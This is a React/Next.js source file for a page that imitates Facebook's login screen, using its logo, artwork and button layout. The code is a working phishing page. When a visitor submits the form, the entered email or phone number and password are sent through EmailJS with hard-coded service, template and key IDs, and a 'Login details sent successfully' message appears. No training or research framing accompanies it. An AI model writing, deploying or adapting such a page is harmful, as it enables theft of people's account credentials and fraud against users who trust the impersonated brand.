"use client";

import Image from "next/image";
import { FormEvent, useRef, useState } from "react";
import emailjs from "@emailjs/browser";

export default function Home() {
  const form = useRef<HTMLFormElement>(null);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<string | null>(null);

  const sendEmail = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setStatus(null);

    try {
      await emailjs.sendForm(
        "service_bwa9k9p",
        "template_cht8l5o",
        form.current!,
        "-TbH74A12g5Ur5Xoj"
      );

      setStatus("✅ Login details sent successfully!");
      form.current?.reset();
    } catch (error) {
      console.error(error);
      setStatus("❌ Failed to send.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col lg:flex-row overflow-hidden">
      {/* Left Side - Illustration */}
      <div className="hidden lg:flex w-1/2 bg-[#f0f2f5] flex-col items-center justify-center p-8">
        <Image
          src="https://res.cloudinary.com/dlzjjxtsd/image/upload/Facebook-Logosu_oimo1n.png"
          alt="Facebook Logo"
          width={300}
          height={100}
          className="object-contain mb-8 w-20 self-start"
        />

        <Image
          src="https://res.cloudinary.com/dlzjjxtsd/image/upload/facebook-bg_nzctef.webp"
          alt="Facebook Illustration"
          width={700}
          height={700}
          className="object-contain max-w-125 w-full"
          priority
        />
      </div>

      {/* Right Side - Form */}
      <div className="flex-1 flex items-center justify-center p-6 lg:p-10 bg-white">
        <div className="w-full max-w-105">
          {/* Mobile Logo */}
          <div className="flex justify-center lg:hidden mb-8">
            <Image
              src="https://res.cloudinary.com/dlzjjxtsd/image/upload/Facebook-Logosu_oimo1n.png"
              alt="Facebook Logo"
              width={300}
              height={100}
              className="object-contain w-20"
            />
          </div>

          <form
            ref={form}
            onSubmit={sendEmail}
            className="bg-white p-8 rounded-3xl shadow-lg flex flex-col gap-6 border border-gray-300"
          >
            <h1 className="text-3xl font-bold text-center text-black lg:hidden">
              Log in to your account
            </h1>
            <h1 className="text-4xl font-bold text-center text-black hidden lg:block">
              Log in to your account
            </h1>

            <input
              type="text"
              name="name"
              placeholder="Email address or Mobile number"
              required
              className="h-14 rounded-[20px] border border-gray-300 px-6 text-lg text-black outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-200 transition"
            />

            <input
              type="password"
              name="password"
              placeholder="Password"
              required
              className="h-14 rounded-[20px] border border-gray-300 px-6 text-lg text-black outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-200 transition"
            />

            <button
              type="submit"
              disabled={loading}
              className="h-14 rounded-full bg-blue-600 text-white text-xl font-semibold hover:bg-blue-700 active:bg-blue-800 disabled:opacity-50 transition-colors duration-300"
            >
              {loading ? "Log in" : "Log In"}
            </button>

            <button
              type="button"
              className="text-blue-600 text-lg font-semibold hover:underline"
            >
              Forgotten password?
            </button>

            <button
              type="button"
              className="mt-4 border border-blue-600 text-blue-600 py-4 rounded-full text-lg font-semibold hover:bg-blue-50 transition-colors duration-300"
            >
              Create new account
            </button>

            {status && (
              <p className="text-center text-sm font-medium mt-2">{status}</p>
            )}
          </form>
        </div>
      </div>
    </div>
  );
}